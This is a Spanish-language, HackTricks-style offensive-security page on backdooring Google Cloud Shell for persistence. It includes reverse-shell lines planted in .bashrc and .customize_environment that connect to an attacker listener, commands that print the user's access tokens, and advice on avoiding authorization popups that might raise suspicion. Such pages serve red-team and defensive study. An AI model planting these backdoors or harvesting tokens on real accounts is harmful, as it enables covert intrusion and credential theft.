# GCP - Persistencia de Cloud Shell

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Para más información revisa:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) te proporciona acceso por línea de comandos a tus recursos en la nube directamente desde el navegador sin ningún coste asociado.

Puedes acceder al Cloud Shell de Google desde la **web console** o ejecutando **`gcloud cloud-shell ssh`**.

Esta consola tiene algunas capacidades interesantes para un atacante:

1. **Any Google user with access to Google Cloud** tiene acceso a una instancia de Cloud Shell totalmente autenticada (Service Accounts pueden, incluso siendo Owners del org).
2. Dicha instancia **mantendrá su home directory durante al menos 120 días** si no hay actividad.
3. No existen **capacidades para que una organisation monitorice** la actividad de esa instancia.

Esto básicamente significa que un atacante puede colocar un backdoor en el home directory del usuario y mientras el usuario se conecte al GC Shell al menos cada 120 days, el backdoor sobrevivirá y el atacante obtendrá un shell cada vez que se ejecute simplemente haciendo:

<details>

<summary>Add reverse shell to .bashrc</summary>
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
</details>

Hay otro archivo en la carpeta home llamado **`.customize_environment`** que, si existe, se va a **ejecutar cada vez** que el usuario acceda al **cloud shell** (como en la técnica anterior). Simplemente inserta el backdoor anterior o uno como el siguiente para mantener la persistencia mientras el usuario use "frecuentemente" el **cloud shell**:

<details>

<summary>Crear backdoor .customize_environment</summary>
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
</details>

> [!WARNING]
> Es importante destacar que la **primera vez que se realiza una acción que requiere autenticación**, aparece una ventana emergente de autorización en el navegador del usuario. Esta ventana debe ser aceptada antes de que el comando pueda ejecutarse. Si aparece una ventana emergente inesperada, podría generar sospechas y potencialmente comprometer el método de persistencia que se está utilizando.

Esta es la ventana emergente al ejecutar `gcloud projects list` desde el cloud shell (como atacante) vista en la sesión del navegador del usuario:

<figure><img src="../../../images/image (10).png" alt=""><figcaption></figcaption></figure>

Sin embargo, si el usuario ha utilizado activamente el cloudshell, la ventana emergente no aparecerá y puedes **obtener tokens del usuario con**:

<details>

<summary>Obtener tokens de acceso desde Cloud Shell</summary>
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
</details>

#### Cómo se establece la conexión SSH

Básicamente, se utilizan estas 3 llamadas API:

- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (permitirá añadir la clave pública que creaste localmente)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (permitirá iniciar la instancia)
- [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (te dirá la IP del Google Cloud Shell)

Pero puedes encontrar más información en [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Referencias

- [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
- [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
- [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{{#include ../../../banners/hacktricks-training.md}}
